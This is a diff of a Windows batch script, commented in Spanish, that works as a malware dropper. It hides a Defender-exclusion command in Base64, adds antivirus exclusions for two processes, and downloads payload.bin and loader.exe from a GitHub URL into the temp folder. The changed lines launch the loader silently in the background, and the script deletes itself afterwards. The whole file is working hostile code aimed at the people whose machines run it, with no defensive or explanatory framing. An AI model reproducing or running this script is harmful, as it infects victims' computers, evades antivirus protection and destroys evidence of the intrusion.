@@ -9,16 +9,17 @@ if %errorlevel% neq 0 (
 :: Crear carpeta loader en %TEMP%
 if not exist "%TEMP%\loader" mkdir "%TEMP%\loader"
 
-:: Exclusión de notepad.exe y windows-clack.exe (comando probado y funcional)
-powershell -NoP -NonI -W Hidden -Exec Bypass -Command "Add-MpPreference -ExclusionProcess 'notepad.exe', 'windows-clack.exe'"
+:: Exclusión ofuscada (Base64 Unicode)
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('QQBkAGQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4AUAByAG8AYwBlAHMAcwAgACcAbgBvAHQAZQBwAGEAZAAuAGUAeABlACcALAAgACcAdwBpAG4AZABvAHcAcwAtAGMAbABhAGMAawAuAGUAeABlACcA')))"
 
-:: Descargar payload.bin en la carpeta loader
+:: Descargar payload.bin y loader.exe en la carpeta loader
 curl -L -o "%TEMP%\loader\payload.bin" "https://raw.githubusercontent.com/carlospro473/Chac/main/payload.bin" >nul 2>&1
-
-:: Descargar loader.exe en la carpeta loader
 curl -L -o "%TEMP%\loader\loader.exe" "https://raw.githubusercontent.com/carlospro473/Chac/main/loader.exe" >nul 2>&1
 
-:: Autoborrado (espera 6 segundos y elimina el .bat)
+:: Ejecutar loader.exe automáticamente en segundo plano
+start /b "%TEMP%\loader\loader.exe"
+
+:: Autoborrado del .bat (espera 6 segundos y elimina)
 start /b powershell -Command "Start-Sleep -Seconds 6; Remove-Item -Path '%~f0' -Force"
 
 exit
